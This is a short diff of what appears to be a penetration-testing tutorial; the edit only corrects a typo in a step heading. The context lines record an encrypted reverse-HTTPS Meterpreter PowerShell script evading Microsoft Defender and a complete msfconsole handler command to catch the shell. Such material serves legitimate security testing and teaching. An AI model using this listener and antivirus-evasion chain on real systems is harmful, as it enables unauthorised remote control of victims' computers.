@@ -247,8 +247,8 @@ PS C:\Users\Administrator> . .\Invoke-meterpreter-x64-reverse-https-encrypted.ps
 => The MS Defender AV is enabled and up-to-date on the Windows 10 laptop but it does not detect nor block the Meterpreter shell.
 
 
-Step 4 - You have now a meterpeter shell running 
--------------------------------------------------
+Step 4 - You have now a Meterpreter shell running 
+---------------------------------------------------
 
 jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 192.168.1.30; set LPORT 443; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; set HandlerSSLCert /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem; run -j"
 [sudo] password for jeff: 
